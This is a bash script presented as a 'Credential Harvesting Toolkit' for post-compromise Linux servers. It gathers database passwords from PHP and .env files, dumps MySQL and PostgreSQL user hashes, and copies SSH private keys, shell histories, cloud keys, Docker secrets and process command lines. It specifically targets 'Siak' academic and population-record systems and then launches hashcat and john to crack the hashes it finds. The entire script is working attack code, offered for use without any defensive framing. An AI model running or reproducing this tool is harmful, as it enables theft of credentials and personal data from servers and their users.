set -euo pipefail

# Colors & Output
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; 
BLUE='\033[0;34m'; PURPLE='\033[0;35m'; NC='\033[0m'

OUTPUT_FILE="creds_loot_$(date +%Y%m%d_%H%M%S).txt"
LOOT_DIR="loot_creds_$(date +%Y%m%d_%H%M%S)"

info_banner() {
    cat << 'EOF'
    ╔══════════════════════════════════════════════╗
    ║        Credential Harvesting Toolkit         ║
    ║   Web/DB/SSH/Config/Env/Memory Exhaustive    ║
    ╚══════════════════════════════════════════════╝
EOF
}

mkdir -p "$LOOT_DIR"/{web,db,ssh,config,secrets,memory}
cd "$LOOT_DIR" || exit 1

log() { echo -e "${GREEN}[+]${NC} $1" | tee -a "$OUTPUT_FILE"; }
warn() { echo -e "${YELLOW}[*]${NC} $1" | tee -a "$OUTPUT_FILE"; }
error() { echo -e "${RED}[-]${NC} $1" | tee -a "$OUTPUT_FILE"; }

# 1. WEB CONFIG HARVESTING (Most Common)
web_loot() {
    log "=== WEB CONFIG LOOT ==="
    
    # PHP Configs (DB creds goldmine)
    find /var/www /home /usr/local /opt -type f \( -name "*.php" -o -name "*.ini" -o -name "wp-config.php" \) \
        -exec grep -lEi "(password|pass|db_|mysql|pgsql|root|DB_PASSWORD)" {} + 2>/dev/null | \
    while read -r file; do
        echo "--- $file ---" >> web/php_creds.txt
        grep -Ei "(password|pass|db_|mysql|pgsql|root|DB_|DATABASE_|mysql_|DB_HOST)" "$file" >> web/php_creds.txt
        echo "" >> web/php_creds.txt
    done
    
    # Apache/Nginx configs
    find /etc -path "*/apache2" -o -path "*/nginx" -o -path "*/httpd" 2>/dev/null | \
    xargs -I {} find {} -name "*.conf" 2>/dev/null | \
    xargs grep -Ei "(auth|pass|secret|key|token)" 2>/dev/null >> web/webserver_creds.txt
    
    # CMS Specific
    [[ -f "/var/www/wordpress/wp-config.php" ]] && grep -Ei "(DB_|AUTH_KEY)" /var/www/wordpress/wp-config.php >> web/wordpress.txt
    [[ -f "/var/www/html/config.php" ]] && grep -Ei "(password|db_|mysql)" /var/www/html/config.php >> web/joomla.txt
}

# 2. DATABASE ACCESS
db_loot() {
    log "=== DATABASE LOOT ==="
    
    # MySQL
    if command -v mysql >/dev/null 2>&1; then
        mysql -e "SHOW DATABASES;" 2>/dev/null && {
            log "MySQL ACCESS!"
            mysql -e "SELECT User,authentication_string FROM mysql.user;" >> db/mysql_users.txt 2>/dev/null
        } || warn "MySQL: No access"
    fi
    
    # PostgreSQL
    if command -v psql >/dev/null 2>&1; then
        PGPASSWORD='' psql -lqt postgres://postgres@localhost >/dev/null 2>&1 && {
            log "PostgreSQL ACCESS!"
            PGPASSWORD='' psql -U postgres -d postgres -c "\du" >> db/postgres_users.txt 2>/dev/null
        } || warn "PostgreSQL: No access"
    fi
    
    # SQLite (Siak common)
    find /var/www /home -name "*.db" -o -name "siak.db" 2>/dev/null | \
    head -5 | xargs -I {} sh -c 'sqlite3 "{}" ".tables" && echo "=== {} ===" && sqlite3 "{}" "PRAGMA table_info(users);"' 2>> db/sqlite_loot.txt
}

# 3. SSH & SYSTEM CREDS
system_loot() {
    log "=== SYSTEM/SSH CREDS ==="
    
    # Users & shells
    cat /etc/passwd | awk -F: '$3>=1000 && $7!~/nologin/ {print $1":"$6}' > ssh/users.txt
    
    # SSH Keys
    find /home /root /var/www -name "id_rsa" -o -name "id_dsa" -o -name "*key" 2>/dev/null | \
    head -10 | xargs -I {} sh -c 'echo "=== {} ==="; cat "{}" 2>/dev/null || ls -la "{}"' >> ssh/keys.txt
    
    # sudoers
    sudo -l 2>/dev/null | grep -v "not allowed" >> ssh/sudo.txt || true
    
    # History files
    find /home /root -path "*/.bash_history" -o -path "*/.zsh_history" 2>/dev/null | \
    head -3 | xargs -I {} sh -c 'echo "=== {} ==="; tail -20 "{}" 2>/dev/null' >> ssh/history.txt
}

# 4. CONFIG & SECRETS
config_loot() {
    log "=== CONFIG SECRETS ==="
    
    # Environment variables
    env | grep -Ei "(pass|key|secret|token|db_|mysql|aws|api)" >> config/env.txt || true
    
    # .env files (Laravel, etc)
    find /var/www /home -maxdepth 4 -name ".env" 2>/dev/null | \
    xargs -I {} sh -c 'echo "=== {} ==="; grep -Ei "(pass|key|secret|db_|APP_|DB_)" "{}"' >> config/dotenv.txt
    
    # AWS/GCP/Azure keys
    find / -type f \( -name "*.pem" -o -name "*.key" -o -name "credentials" \) 2>/dev/null | \
    head -10 | xargs grep -lEi "(AKIA|AWS_|accesskey|secretkey)" 2>/dev/null >> config/cloud_keys.txt
    
    # Docker secrets
    [[ -d "/run/secrets" ]] && find /run/secrets -type f 2>/dev/null | head -5 | xargs cat >> config/docker_secrets.txt
}

# 5. MEMORY & PROCESS CREDS
memory_loot() {
    log "=== MEMORY DUMP ==="
    
    # Processes with args (DB creds in cmdline)
    ps aux | grep -E "(mysql|postgres|db_|pass)" | grep -v grep >> memory/processes.txt || true
    
    # /proc cmdline
    for pid in /proc/[0-9]*; do
        [ -r "$pid/cmdline" ] && grep -qi "mysql\|postgres\|pass" "$pid/cmdline" 2>/dev/null && {
            echo "=== $(cat $pid/comm) PID $(basename $pid) ===" >> memory/cmdline.txt
            cat "$pid/cmdline" | tr '\0' ' ' >> memory/cmdline.txt
        }
    done
}

# 6. SIak-Specific Loot
siak_loot() {
    log "=== SIAK-SPECIFIC ==="
    
    # Common Siak paths
    SIAC_PATHS=( "/var/www/html/siakad" "/var/www/siak" "/opt/siak" "/home/siak" )
    
    for path in "${SIAC_PATHS[@]}"; do
        [[ -d "$path" ]] || continue
        log "Siak found: $path"
        
        find "$path" -name "*.php" -exec grep -lEi "(password|db_|mysql)" {} + 2>/dev/null | \
        head -3 | xargs -I {} sh -c 'echo "--- {} ---"; grep -Ei "(pass|db_|mysql)" "{}"' >> secrets/siak_creds.txt
    done
    
    # Siak DB config
    find /var/www -path "*/config.php" -exec grep -lEi "siak|penduduk" {} + 2>/dev/null | \
    xargs grep -Ei "(host|db_|mysql)" >> secrets/siak_db.txt
}

# 7. CRACK HASHES
crack_hashes() {
    log "=== HASH CRACKING ==="
    
    # Extract all potential hashes
    grep -rEi "(md5|\$1|\$2[aby]|\$[56])" . 2>/dev/null >> hashes.txt || true
    
    [ -s "hashes.txt" ] && {
        log "Found $(wc -l < hashes.txt) hash(es), cracking..."
        
        # Multi-tool cracking
        hashcat -m 0,100,1000,1500 hashes.txt /usr/share/wordlists/rockyou.txt \
            --potfile-path=hashcat.pot --status --status-timer=10 &
        
        john --format=Raw-MD5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt \
            --pot=john.pot 2>/dev/null &
    }
}

main() {
    info_banner
    log "Starting credential harvest..."
    
    # Run all modules
    web_loot
    db_loot
    system_loot
    config_loot
    memory_loot
    siak_loot
    crack_hashes
    
    # Summary
    {
        echo ""
        echo "=== SUMMARY ==="
        echo "Files: $(find . -type f | wc -l)"
        echo "Potential creds: $(grep -rEi "(password|pass|secret|key|token)" . 2>/dev/null | wc -l) matches"
        echo "DB access: $(find db/ -name "*.txt" -exec grep -l "ACCESS" {} + 2>/dev/null | wc -l)"
        echo "Output: $PWD/"
    } >> "$OUTPUT_FILE"
    
    log "COMPLETE! Check $OUTPUT_FILE & $PWD/"
    ls -la
}

main